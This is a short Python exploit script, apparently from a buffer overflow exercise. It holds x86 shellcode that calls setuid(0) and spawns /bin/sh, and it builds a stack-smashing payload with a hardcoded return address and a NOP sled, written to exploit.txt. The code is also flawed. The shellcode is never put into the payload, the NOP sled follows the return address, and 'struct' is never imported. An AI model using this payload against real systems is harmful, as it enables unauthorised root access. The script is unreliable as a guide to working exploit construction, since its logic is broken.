# Shellcode from shellcode.py
setuid = b'1\xdb\x8dC\x17\x99\xcd\x80'
bin_sh = (
    b'\xeb\x1f^\x89v\x081\xc0\x88F\x07\x89F\x0c\xb0\x0b\x89\xf3\x8dN\x08'
    b'\x8dV\x0c\xcd\x801\xdb\x89\xd8@\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh')

shellcode = setuid + bin_sh

# Address where the shellcode will be placed
shellcode_address = 0xbfffffff  

# Craft the payload
payload = b"A" * 100  # Fill the buffer
payload += struct.pack("<I", shellcode_address)  # Overwrite the return address with the shellcode address
payload += b"\x90" * (33 - len(payload) % 33)  # NOP sled to ensure alignment

# Write the payload to a file
with open("exploit.txt", "wb") as f:
    f.write(payload)
